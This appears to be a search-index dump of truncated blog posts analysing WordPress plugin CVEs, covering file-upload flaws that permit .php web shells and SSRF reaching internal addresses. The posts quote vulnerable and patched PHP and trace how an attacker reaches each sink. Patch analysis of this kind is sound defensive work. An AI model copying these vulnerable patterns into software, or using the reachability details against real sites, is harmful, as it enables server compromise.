false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } In the vulnerable version, the import_woomail() function calls wp_handle_upload() to upload files to WordPress‚Äôs uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug However, the option test_type =\u003e false causes WordPress to skip MIME type checking against the whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e true, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } The patch changes 'test_type' =\u003e true, enabling MIME checks against the whitelist and preventing dangerous uploads like .php web shells. Vulnerable Code static private function import_woomail( $wp_customize ) { // Make sure we have a valid nonce. if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } // Make sure WordPress upload support is loaded. if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } // Load the export/import option class. require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php'; // Setup global vars. global $wp_customize; global $kt_woomail_import_error; // Setup internal vars. $kt_woomail_import_error = false; $template = 'kadence-woomail-designer'; $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); // Make sure we have an uploaded file. if ( isset( $file['error'] ) ) { $kt_woomail_import_error = $file['error']; return; } if ( ! file_exists( $file['file'] ) ) { $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' ); return; } // Get the upload data. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); // Check for support of older export files. Will remove later. if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } // Remove the uploaded file. unlink( $file['file'] ); ... exit; } The import_woomail() function handles uploads and imports for the Kadence WooCommerce Email Designer plugin: Verify nonce to ensure request validity (prevent CSRF): if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } Perform the upload via wp_handle_upload(): $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_up","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The ‚ÄúUnrestricted Upload of File with Dangerous Type‚Äù vulnerability in TemplateInvaders TI WooCommerce Wishlist allows uploading a Web Shell to the web server. This issue affects TI WooCommerce Wishlist: from n/a to before 2.10.0. CVE ID: CVE-2025-47577 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.9.2 Patched Versions: 2.10.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress TI WooCommerce Wishlist Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - TI WooCommerce Wishlist: 2.9.2 (vulnerable) and 2.10.0 (patched). Diff tool - Meld or any diff tool to check and compare differences between versions. WooCommerce WC Fields Factory Analysis Patch Diff function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, 'test_type' =\u003e false, ] ); return $upload; } In the vulnerable version, the function tinvwl_upload_file_wc_fields_factory() calls wp_handle_upload() to upload files into WordPress‚Äôs official uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug However, the option test_type =\u003e false causes WordPress to skip MIME Type checking against its allowed whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, ] ); return $upload; } The patch removes the 'test_type' =\u003e false option, so by default 'test_type' =\u003e true is used, enabling MIME checks against the whitelist and preventing uploads of dangerous files like .php web shells. Vulnerable Code Question Before tracing further, I want to inspect wp_handle_upload() to answer two questions: Why does removing 'test_type' =\u003e false enable MIME whitelist checks? What does that whitelist include? wp_handle_upload() is a wrapper for _wp_handle_upload() function wp_handle_upload( \u0026$file, $overrides = false, $time = null ) { /* * $_POST['action'] must be set and its value must equal $overrides['action'] * or this: */ $action = 'wp_handle_upload'; if ( isset( $overrides['action'] ) ) { $action = $overrides['action']; } return _wp_handle_upload( $file, $overrides, $time, $action ); } wp_handle_upload() sets $action and calls _wp_handle_upload(). In the file containing _wp_handle_upload(), line 915 $test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true; üëâ This assigns the value to $test_type ‚Äî if $overrides contains the 'test_type' key, its value is used; otherwise the default is true. So when we don‚Äôt pass test_type or pass test_type =\u003e true, $test_type is true. At lines 953-973 if ( $test_type ) { $wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect. if ( $proper_filename ) { $file['name'] = $proper_filename; } if ( ( ! $type || ! $ext ) \u0026\u0026 ! current_user_can( 'unfiltered_upload' ) ) { return call_user_func_array( $upload_error_handler, array( \u0026$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) ); } if ( ! $type ) { $type = $file['type']; } } else { $type = ''; } If $test_type = true, the function calls wp_check_filetype_and_ext() to validate the file extension and MIME type based on WordPress‚Äôs allowed whitelist. If the file lacks an allowed extension or MIME type, and the user does not have the unfiltered_upload capability, the upload is rejected. Lines 3089-3315 functi","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Embed PDF for WPForms Plugin.","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Embed PDF for WPForms plugin for WordPress contains a vulnerability that allows arbitrary file uploads due to missing file type checks in the ajax_handler_download_pdf_media function in all versions up to and including 1.1.5. This allows an authenticated attacker with access level Subscriber or higher to upload arbitrary files to the affected site‚Äôs server, which may lead to remote code execution. CVE ID: CVE-2025-10647 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.1.5 Patched Versions: 1.1.6 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress Embed PDF for WPForms Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed PDF for WPForms: 1.1.5 (vulnerable) and 1.1.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. WPForms Plugin Analysis Patch Diff public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } In the vulnerable version, the ajax_handler_download_pdf_media() function downloads a PDF file from the provided URL into WordPress‚Äôs Media Library via AJAX but does not check the file type or user capabilities. Bug An attacker could upload a .php file to achieve RCE public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } The patch: Adds a user capability check: if ( ! current_user_can( 'upload_files' ) ) { ... } Only users with upload capability can invoke the handler. Restricts accepted uploaded file types: if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } wp_check_filetype() (WP Core) returns two keys: array( 'ext' =\u003e string|false, 'type' =\u003e string|false ) If type is not found in wp_get_mime_types() it returns false. By default this accepts only non-executable file types (does not accept php). Vulnerable Code The ajax_handler_download_pdf_media() function: Checks the CSRF nonce check_ajax_referer( 'epdf_wf_download_pdf_media' ); S","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Podlove Podcast Publisher Plugin.","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Podlove Podcast Publisher plugin for WordPress has a vulnerability allowing arbitrary file uploads due to missing file type checks in the 'move_as_original_file' function in all versions up to and including 4.2.6. This enables unauthenticated attackers to upload arbitrary files to the affected site‚Äôs server, which can lead to remote code execution. CVE ID: CVE-2025-10147 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.2.6 Patched Versions: 4.2.7 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress Podlove Podcast Publisher Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Podlove Podcast Publisher: 4.2.6 (vulnerable) and 4.2.7 (patched). Diff tool - Meld or any diff tool to inspect and compare the differences between the two versions. Analysis Vulnerable Code According to the CVE description the vulnerability is located in the move_as_original_file() function public function move_as_original_file($file) { $move_new_file = @rename($file, $this-\u003eoriginal_file()); if (false === $move_new_file) { Log::get()-\u003eaddWarning( sprintf( __('Podlove Image Cache: The downloaded image could not be moved to %s.'), $this-\u003eoriginal_file() ) ); } } The move_as_original_file($file) function Performs a move of the temporary file $file (just downloaded from the URL) ‚Üí to the fixed path returned by $this-\u003eoriginal_file(). rename() in PHP = move file (relocates the file, not copy). The @ operator suppresses PHP warnings if the operation fails. If rename() returns false, the plugin logs a warning. public function original_file() { return implode(DIRECTORY_SEPARATOR, [ $this-\u003eupload_basedir, $this-\u003efile_name('original') ]); } ‚Üí Produces an absolute path on the server, for example: /var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png $this-\u003eupload_basedir (from __construct()) Class Image { public function __construct($url, $file_name = '') { // FIXME: if $file_name is empty, the url will not work. I must not treat this silently! $this-\u003esource_url = trim($url ?? ''); $this-\u003efile_name = sanitize_title($file_name); // manually remove troublemaking characters // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/ // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947 if (function_exists('iconv')) { $this-\u003efile_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this-\u003efile_name); } $this-\u003efile_name = preg_replace('~[^-a-z0-9_]+~', '', $this-\u003efile_name); $this-\u003efile_extension = $this-\u003eextract_file_extension(); $this-\u003eid = md5($url.$this-\u003efile_name); // create subdirectories to avoid too many directories in the root directory $id_directory = substr($this-\u003eid, 0, 2).'/'.substr($this-\u003eid, 2); $this-\u003eupload_basedir = self::cache_dir().$id_directory; $this-\u003eupload_baseurl = content_url('cache/podlove/').$id_directory; } } Built from cache_dir() and an MD5 hash of the URL, ‚Üí located under the directory: wp-content/cache/podlove/\u003cfirst 2 characters\u003e/\u003cremaining characters\u003e/ Tip Here you can pass only $url, for example: $url=\"https://example.com/filename.php\" then $this-\u003eid=\"b1555a128239e3f59ccfb8d17e5b6c5a\" $this-\u003eupload_basedir=\"http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a\" You can control the resulting file path. move_as_original_file() is called inside download_source() public function download_source() { $source_url = $this-\u003esource_url; ... $source_domain = wp_parse_url($source_url, PHP_URL_HOST); $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0]; // if domains match, see if the image is part of the Publisher // and can be copied on the filesystem, skipping http if ($current_domain == $source_domain) { ... return; } // for download_url() require_once ABSPATH.'wp-admin/includes/file.php'; $result = self::download_url($this-\u003esource_url); ... list($temp_file, $response) = $result; if (!\\Podlove\\is_image($temp_file)) { ... wp_delete_file($tem","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info CVE ID: CVE-2025-62065 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.6.5 Patched Versions: 1.6.6 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress RTMKit Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - RTMKit: 1.6.5 (vulnerable) and 1.6.6 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. Elementor Analysis Patch diff function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No file uploaded.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip files are allowed.'); } $upload_dir = wp_upload_dir(); // path on server $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); // public URL $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); if (!move_uploaded_file($file['tmp_name'], $tmpFilePath)) { wp_send_json_error('Failed to save temporary file.'); } $res = $this-\u003etemplate_extract($tmpFileUrl, $file['name'], true); // after done remove file if (file_exists($tmpFilePath)) unlink($tmpFilePath); if ($res) { wp_send_json_success('Template successfully uploaded and extracted.'); } else { wp_send_json_error($res); } } function template_extract($url, $id, $return = false) { $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; $tempFile = wp_tempnam($url); $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; $response = wp_remote_get($url, ['timeout' =\u003e 300]); if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); $zip-\u003eextractTo($targetDir); $zip-\u003eclose(); unlink($tempFile); $option = get_option('rtm_template_installed', []); // Default to array if option not present if (!is_array($option)) { $option = []; // Ensure $option is an array } $option[$hashId] = [ 'template_id' =\u003e $id ]; update_option('rtm_template_installed', $option); // Save back to database if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } In the vulnerable version: No proper user capability check: it only calls check_ajax_referer() but does not verify capability (e.g., current_user_can) ‚Üí a user with a valid nonce or a leaked nonce can still upload. Temporary file saved in the public uploads folder (wp_upload_dir()): $tmpFilePath is under uploads/ so it is accessible via a URL ($tmpFileUrl) while the file exists. Retrieves the file via the public URL before extraction: template_extract() uses wp_remote_get($tmpFileUrl) ‚Üí depends on a public URL. Extracts directly into a public directory: extractTo($targetDir) into uploads/rometheme_template ‚Üí if a .php file is placed, the webserver may execute it. No whitelist/deny for extensions: does not remove or reject executable files (.php, .phtml, .phar, .sh, .exe, ‚Ä¶). No content check for embedded PHP: there is no step to scan for \u003c?php before saving. Temporary public exposure risk: because the temp file is public during processing, an attacker has time to access/set up payload before the file is unlinked. =\u003e High likelihood of RCE. function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No File Uploaded.'); } if (! current_user_can('manage_options')) { wp_send_json_error( array('message' =\u003e 'Insufficient permissions'), 403 ); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip file allowed.'); } $upl","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Ninja Tables ‚Äì Easy Data Table Builder plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 5.0.18, via the args[url] parameter. This vulnerability allows unauthenticated attackers to perform web requests to arbitrary locations originating from the web application, and can be used to query and modify information from internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) and 5.0.19 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. Analysis Patch diff Per the CVE description, the notable location in the patch is the code handling args[url] ‚Äî this is likely the root cause of the vulnerability since this parameter is used directly in the request flow. Precondition location causing the vulnerability In the patch, the exploitable code has been disabled (commented out with //). Vulnerable Code public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } The registerAsyncRequestHandler() function registers and handles an async endpoint in WordPress ‚Äî specifically via admin_post_nopriv_{action}, i.e., a hook that allows unauthenticated (nopriv) users to send requests. Specifically, the function processes as follows: Create a unique action name for the plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } makeAsyncRequestAction() generates a unique identifier for the plugin by concatenating a fixed prefix (wpf-async-request-) with the SHA1 hash of the plugin name (app.slug). Since the plugin name is \"ninja-tables\", the resulting value will be: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 Register the action hook with an anonymous callback App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); When an HTTP request is sent to /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 the logic inside the anonymous function will be invoked. Retrieve the Request object instance from the App container and read two main parameters $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Instantiate a Client object with the baseUrl taken from the request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Client::make() is responsible for creating and configuring a new Client instance used to manage and send HTTP requests. The $baseUrl value is passed directly from $requestUrl ‚Äî i.e., the URL provided by the user in args.url. Collect all other parameters except action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Decode and extract the callback function from the request parameters $callback = st","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The ‚ÄúEmbed Any Document ‚Äì Embed PDF, Word, PowerPoint and Excel Files‚Äù plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 2.7.5 via the 'embeddoc' shortcode. This vulnerability allows authenticated attackers with Contributor access or higher to make web requests to arbitrary destinations originating from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) Required Privilege: Contributor Product: WordPress Embed Any Document Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) and 2.7.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. Analysis Patch diff public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } In the vulnerable version, embed_shortcode() performs an HTTP HEAD request using wp_remote_head() with the url value taken directly from $shortcode_atts['url']. Because there is no validation, filtering, or scope limitation for the URL, an attacker can supply an arbitrary URL ‚Äî leading to requests being sent to local services and causing SSRF. public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } The patch replaces wp_remote_head() with wp_safe_remote_head(), which adds safety checks to prevent access to internal/private/loopback/link-local addresses, thereby mitigating SSRF risk. Vulnerable Code To reach the wp_remote_head( $shortcode_atts['url'] ) call in embed_shortcode(), an attacker must bypass the following checks: url must be set and not empty if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) $show must be set to true before entering the HEAD call $show defaults to false. It becomes true only when if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) returns true and one of the following is satisfied: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download equals 'alluser' or 'all'. download equals 'logged' and is_user_logged_in() returns true (i.e., the user is logged in). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $blacklist, true ) ) { return false; } else { return true; } } allowdownload() returns tr","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info A Server-Side Request Forgery (SSRF) vulnerability in the BoldGrid Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor plugin allows an attacker to perform forged requests from the server. This issue affects the Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor plugin from an unknown version up to 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor: 1.27.8 (vulnerable) and 1.27.9 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. Analysis Patch diff public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } In the vulnerable version, get_redirect_url() reads an array of URLs from $_POST['urls'], then iterates each element and issues a request via wp_remote_head($url) without validating or sanitizing the input. This allows an attacker to supply arbitrary URLs so the server will request internal addresses like 127.0.0.1 or 169.254.169.254, leading to SSRF. Also, because there are no timeout or redirection limits, the function can be abused to cause hangs or denial-of-service (DoS). public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' 